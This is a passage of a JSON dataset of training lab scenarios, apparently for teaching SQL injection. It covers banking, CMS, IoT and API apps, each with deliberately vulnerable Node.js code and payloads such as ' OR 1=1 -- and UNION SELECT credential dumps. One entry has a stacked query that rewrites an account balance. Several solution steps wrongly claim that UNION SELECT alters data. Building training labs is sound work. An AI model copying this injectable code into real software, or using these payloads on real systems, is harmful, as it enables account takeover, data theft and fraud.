      "Intercept the loan application form submission with Burp Suite and identify the vulnerable loan amount and user details fields.",
      "Inject SQL payloads such as ' OR 1=1 -- to bypass authentication and loan application logic.",
      "Use UNION SELECT to inject fake loan records into the system.",
      "Verify the success of loan application by checking the database for injected records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-loan', (req, res) => {\n  const { userId, amount, duration } = req.body;\n  const sql = `INSERT INTO loans (user_id, amount, duration) VALUES ('${userId}', '${amount}', '${duration}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, amount FROM loans --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The transaction history page is vulnerable to SQL Injection. Users can filter their transaction history by date, but the date field is not properly sanitized. Attackers can inject SQL payloads to access other users' transaction data or manipulate the transaction records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable date field.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and display all transaction records.",
      "Use UNION SELECT to extract multiple columns from the transactions table.",
      "Verify the successful extraction of transaction history data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { startDate, endDate } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_date BETWEEN '${startDate}' AND '${endDate}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transactions');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT user_id, transaction_id, amount FROM transactions --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Login",
    "Lab Description": "The user login form is vulnerable to SQL Injection. The application fails to properly sanitize the username and password fields. Attackers can inject SQL payloads to bypass authentication and gain unauthorized access to users' accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request with Burp Suite and identify the vulnerable username and password fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and login as any user.",
      "Verify the successful login by using the injected payload.",
      "Check for unauthorized access to user accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The account balance check page is vulnerable to SQL Injection. Users can view their account balance by providing their account number. Attackers can inject SQL payloads to retrieve other users' account balances or modify their own balance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and identify the vulnerable account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve all account balances.",
      "Use UNION SELECT to extract balance data for different users.",
      "Verify the successful retrieval and manipulation of account balance information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Payment Processing",
    "Lab Description": "The payment processing page is vulnerable to SQL Injection. The application processes payments based on the amount and user ID parameters, but fails to sanitize the input. Attackers can inject SQL payloads to alter payment amounts or access unauthorized payment records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the payment request with Burp Suite and identify the vulnerable user ID and payment amount fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and modify payment records.",
      "Use UNION SELECT to query payment records and payment amounts.",
      "Verify the successful alteration of payment records and the payment amount."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/process-payment', (req, res) => {\n  const { userId, amount } = req.body;\n  const sql = `INSERT INTO payments (user_id, amount) VALUES ('${userId}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Payment failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, amount FROM payments --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Admin Panel User Management",
    "Lab Description": "The admin panel for managing user accounts is vulnerable to SQL Injection. Admins can search for users by their ID or username. Attackers can exploit this vulnerability to extract all user information, including usernames, account balances, and transaction histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the admin user search request with Burp Suite and identify the vulnerable user ID field.",
      "Inject SQL payloads like ' UNION SELECT username, balance FROM users -- to extract user data.",
      "Use UNION SELECT to query the users' table and extract sensitive user details.",
      "Verify the successful extraction of multiple user records and sensitive information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/user-management', (req, res) => {\n  const { userId } = req.query;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, balance FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Advanced SQL Injection in Transfer Funds",
    "Lab Description": "The funds transfer feature of the banking portal allows users to transfer funds to other accounts using an account number. However, the application fails to sanitize input properly, allowing for SQL injection attacks. Attackers can bypass authentication, manipulate transfer amounts, and redirect funds to different accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the funds transfer request using Burp Suite and identify the vulnerable account number and transfer amount fields.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and execute the transfer function.",
      "Use UNION SELECT to extract account information from the users' table and manipulate the transfer amount.",
      "Verify successful fund transfer to a different account, and confirm manipulation of transfer details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer-funds', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_number = '${fromAccount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else {\n      const sql2 = `UPDATE accounts SET balance = balance + ${amount} WHERE account_number = '${toAccount}'`;\n      db.query(sql2, (err2, result2) => {\n        if (err2) res.status(500).send('Transfer failed');\n        else res.json({ success: true });\n      });\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --",
      "'; UPDATE accounts SET balance = 999999 WHERE account_number = '123456' --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in API Authentication",
    "Lab Description": "The API gateway that handles user authentication is vulnerable to SQL Injection in the login endpoint. Attackers can inject malicious SQL payloads in the username or password fields to bypass authentication and obtain an authentication token, gaining unauthorized access to the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send login requests and identify the vulnerable username and password fields.",
      "Inject SQL payloads like ' OR 'a'='a' -- to bypass authentication and retrieve the authentication token.",
      "Use the obtained token to access protected API endpoints.",
      "Verify successful access to the API with the injected authentication token."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ token: generateToken(result[0]) });\n  });\n});",
    "payloads": [
      "' OR 'a'='a' --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Control Panel",
    "Lab Description": "The IoT device control panel is vulnerable to SQL Injection. Attackers can exploit this vulnerability by manipulating device IDs in the SQL query, allowing them to control devices that they do not own or view device data from other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite to inspect the device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and control devices belonging to other users.",
      "Use UNION SELECT to extract device-specific data or modify device settings.",
      "Verify the successful exploitation by controlling unauthorized devices or extracting device data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-control', (req, res) => {\n  const { deviceId, action } = req.body;\n  const sql = `UPDATE devices SET status = '${action}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Device control failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, status FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Blog Post Retrieval",
    "Lab Description": "The CMS used by the blog site is vulnerable to SQL Injection in the post retrieval functionality. Attackers can inject SQL payloads into the post ID parameter, allowing them to retrieve any post content from the database, including unpublished or private posts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable post ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve all blog posts from the database.",
      "Use UNION SELECT to extract private or unpublished posts.",
      "Verify successful retrieval of unauthorized content."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/post', (req, res) => {\n  const { postId } = req.query;\n  const sql = `SELECT * FROM posts WHERE post_id = '${postId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve post');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT post_id, title, content FROM posts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Comment Section",
    "Lab Description": "The comment section of the CMS blog is vulnerable to SQL Injection. Attackers can inject SQL payloads to retrieve admin user credentials or other sensitive information stored in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the comment submission request with Burp Suite and identify the vulnerable comment parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract admin credentials.",
      "Use UNION SELECT to query the users' table and retrieve admin information.",
      "Verify successful extraction of admin credentials and sensitive data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { postId, comment } = req.body;\n  const sql = `INSERT INTO comments (post_id, comment_text) VALUES ('${postId}', '${comment}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Balance Check",
    "Lab Description": "The banking portal allows users to check their account balance. However, due to improper input validation, attackers can inject SQL queries into the account number field to extract balance information from unauthorized accounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve the balance of all accounts.",
      "Use UNION SELECT to extract balance information and account details from the database.",
      "Verify successful exploitation by accessing account balance information from unauthorized accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Configuration",
    "Lab Description": "The IoT dashboard allows users to configure their devices. Due to improper input sanitization, an attacker can inject malicious SQL code into the device ID field, gaining control over other users' devices and retrieving sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the request and identify the device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to control devices that belong to other users.",
      "Use UNION SELECT to extract device configurations, including sensitive information.",
      "Verify successful exploitation by accessing or altering device configurations belonging to other users."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-configuration', (req, res) => {\n  const { deviceId, config } = req.body;\n  const sql = `UPDATE devices SET config = '${config}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update configuration');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, config FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in User Registration",
    "Lab Description": "The user registration endpoint in the API gateway is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields to bypass registration checks and add malicious accounts to the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the registration request and identify the vulnerable fields (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass validation and add new users to the database.",
      "Use UNION SELECT to retrieve existing usernames and email addresses from the database.",
      "Verify successful registration of a new user or retrieval of existing users' data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const { username, password, email } = req.body;\n  const sql = `INSERT INTO users (username, password, email) VALUES ('${username}', '${password}', '${email}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Search Functionality",
    "Lab Description": "The CMS search feature is vulnerable to SQL Injection. An attacker can inject malicious SQL code into the search query, allowing them to bypass filters and retrieve sensitive information from the database, such as user credentials or unpublished content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the search query and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to retrieve sensitive user information.",
      "Use UNION SELECT to access sensitive data such as unpublished posts or private content.",
      "Verify successful retrieval of unauthorized data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM posts WHERE content LIKE '%${query}%'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-Commerce Site - SQL Injection in Product Filters",
    "Lab Description": "The e-commerce site's product filter functionality is vulnerable to SQL Injection. Attackers can inject SQL payloads into the filter parameters, allowing them to retrieve product details, manipulate prices, or bypass product visibility checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the filter request using Burp Suite and identify the vulnerable filter parameters.",
      "Inject SQL payloads like ' UNION SELECT product_id, price, name FROM products -- to retrieve product information.",
      "Use UNION SELECT to manipulate product visibility or alter prices.",
      "Verify successful manipulation of product details and price display."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const { filter } = req.query;\n  const sql = `SELECT * FROM products WHERE category = '${filter}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve products');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, price, name FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Funds Transfer",
    "Lab Description": "The funds transfer functionality in the banking portal is vulnerable to SQL Injection. An attacker can inject malicious SQL queries into the account number and amount fields, bypassing validation and transferring funds to unauthorized accounts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the funds transfer request and identify the vulnerable parameters (account number, amount).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass validation and initiate unauthorized fund transfers.",
      "Use UNION SELECT to extract data such as account balances or to manipulate the transfer amount.",
      "Verify successful transfer of funds to an unauthorized account."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer-funds', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_number = '${fromAccount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error transferring funds');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in User Management",
    "Lab Description": "The CMS has a user management system that allows administrators to add and remove users. Due to improper input sanitization, attackers can inject SQL queries into the user ID or role fields, modifying user privileges or deleting unauthorized accounts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable user ID and role parameters.",
      "Inject SQL payloads like ' OR 1=1 -- to bypass user validation and escalate privileges.",
      "Use UNION SELECT to retrieve a list of users and their roles, or delete user accounts.",
      "Verify successful modification of user roles or unauthorized deletion of accounts."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/manage-users', (req, res) => {\n  const { userId, role } = req.body;\n  const sql = `UPDATE users SET role = '${role}' WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update user');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT user_id, role FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in Product Review",
    "Lab Description": "The product review API in an e-commerce platform is vulnerable to SQL Injection. Attackers can inject malicious SQL queries into the review text or rating fields, allowing them to alter product ratings or view other users' reviews.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to inspect the product review API request and identify vulnerable fields (review text, rating).",
      "Inject SQL payloads like ' UNION SELECT product_id, rating FROM reviews -- to retrieve product ratings and reviews.",
      "Use UNION SELECT to alter product ratings or inject fake reviews into the system.",
      "Verify successful manipulation of product reviews or ratings."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/product-review', (req, res) => {\n  const { productId, reviewText, rating } = req.body;\n  const sql = `INSERT INTO reviews (product_id, review_text, rating) VALUES ('${productId}', '${reviewText}', '${rating}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to post review');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, review_text FROM reviews --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Firmware Upload",
    "Lab Description": "The IoT dashboard is vulnerable to SQL Injection in the device firmware upload feature. An attacker can inject SQL payloads into the device ID field, potentially compromising multiple devices or extracting firmware data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the firmware upload request and identify the vulnerable device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to manipulate the firmware upload process and compromise other devices.",
      "Use UNION SELECT to extract device firmware data from the database.",
      "Verify successful exploitation by viewing or altering device firmware settings."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/upload-firmware', (req, res) => {\n  const { deviceId, firmware } = req.body;\n  const sql = `UPDATE devices SET firmware = '${firmware}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error uploading firmware');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, firmware FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Statements",
    "Lab Description": "The banking portal allows users to view their account statements. However, due to improper input sanitization, an attacker can inject SQL payloads into the account number field to access other users' statements and perform unauthorized operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the account statement request and identify the vulnerable account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve account statements from unauthorized accounts.",
      "Use UNION SELECT to extract account transaction details and balances.",
      "Verify successful retrieval of unauthorized account statements and transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-statement', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT * FROM statements WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve statement');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, transaction_date, amount FROM statements --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in User Authentication",
    "Lab Description": "The API gateway in a web application is vulnerable to SQL Injection in the user authentication process. An attacker can bypass the login process by injecting SQL payloads into the username or password fields, allowing access to the system.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and identify the vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and gain unauthorized access.",
      "Use UNION SELECT to retrieve user information or escalate privileges.",
      "Verify successful login with injected credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Search Function",
    "Lab Description": "A CMS has a search functionality that allows users to search for posts by title. The search query parameter is not properly sanitized, allowing attackers to inject SQL queries and retrieve sensitive information or manipulate results.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture the search request using Burp Suite and identify the vulnerable query parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract sensitive data.",
      "Use time-based or boolean-based SQL injection to infer additional data from the database.",
      "Verify successful data extraction or manipulation of search results."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM posts WHERE title LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The transaction history page in the banking portal is vulnerable to SQL Injection. An attacker can inject SQL payloads into the transaction ID field, allowing them to view transactions of other users or manipulate transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable transaction ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to view other users' transactions.",
      "Use UNION SELECT to extract sensitive transaction details, such as amounts and timestamps.",
      "Verify successful data manipulation or unauthorized access to transactions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving transaction history');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, date FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Control Panel",
    "Lab Description": "The IoT dashboard allows users to control their connected devices. However, the device control panel is vulnerable to SQL Injection. An attacker can inject SQL queries into device ID fields, potentially controlling or compromising IoT devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the device control request and identify the vulnerable device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to control other devices or gain unauthorized access to device settings.",
      "Use UNION SELECT to extract sensitive device data such as firmware versions or configurations.",
      "Verify successful exploitation by manipulating the device's state or extracting sensitive data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/control-device', (req, res) => {\n  const { deviceId, action } = req.body;\n  const sql = `UPDATE devices SET state = '${action}' WHERE device_id = '${deviceId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error controlling device');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, state FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Transfer Logs",
    "Lab Description": "The banking portal stores logs of account transfer activities, which are displayed to administrators. Due to insufficient input sanitization, attackers can inject SQL payloads into the transaction ID or user ID fields to manipulate logs and hide unauthorized transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the transfer log request and identify the vulnerable transaction ID and user ID parameters.",
      "Inject SQL payloads like ' OR 1=1 -- to manipulate the logs and erase unauthorized transactions.",
      "Use UNION SELECT to alter transaction log entries, such as account numbers and amounts.",
      "Verify successful log manipulation or unauthorized log deletions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-logs', (req, res) => {\n  const { transactionId, userId } = req.query;\n  const sql = `SELECT * FROM transfer_logs WHERE transaction_id = '${transactionId}' AND user_id = '${userId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transfer logs');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, user_id, amount FROM transfer_logs --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Comment Section",
    "Lab Description": "The CMS has a comment section where users can leave feedback. However, the system fails to sanitize user input, allowing attackers to inject SQL queries into the comment field. This can lead to the exposure of sensitive data or system manipulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable comment field.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract user credentials.",
      "Use boolean-based SQL injection to retrieve hidden data, such as comment counts or internal admin information.",
      "Verify successful data extraction or system manipulation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Login",
    "Lab Description": "The banking portal's account login functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields, allowing unauthorized access to user accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify the vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Use UNION SELECT to extract sensitive account information, such as balance and transaction history.",
      "Verify successful login or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM accounts WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in Product Search",
    "Lab Description": "The product search feature of an e-commerce platform's API gateway is vulnerable to SQL Injection. Attackers can inject SQL payloads into the search parameter to retrieve product data or access sensitive information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search query request and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT product_id, product_name, price FROM products -- to extract product data.",
      "Use time-based or boolean-based SQL injection to infer additional product details or customer information.",
      "Verify successful data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, product_name, price FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Transfer",
    "Lab Description": "The banking portal's fund transfer page is vulnerable to SQL Injection. An attacker can inject SQL queries into the transfer form, allowing unauthorized transactions or the leakage of account balances.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transfer request using Burp Suite to identify the vulnerable parameters (account number, amount).",
      "Inject SQL payloads like ' UNION SELECT account_id, balance FROM accounts -- to extract balance details.",
      "Use UNION SELECT to modify transfer amounts or redirect funds to another account.",
      "Verify successful transaction manipulation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_id = '${fromAccount}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Settings",
    "Lab Description": "The IoT dashboard has a device settings page that is vulnerable to SQL Injection. An attacker can inject SQL payloads into device parameters, allowing them to manipulate device configurations or access sensitive device data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the device settings request using Burp Suite to identify the vulnerable parameters (device ID, setting).",
      "Inject SQL payloads like ' UNION SELECT device_id, device_name, firmware_version FROM devices -- to extract sensitive data.",
      "Use boolean-based SQL injection to determine device configurations or exploit vulnerabilities in firmware.",
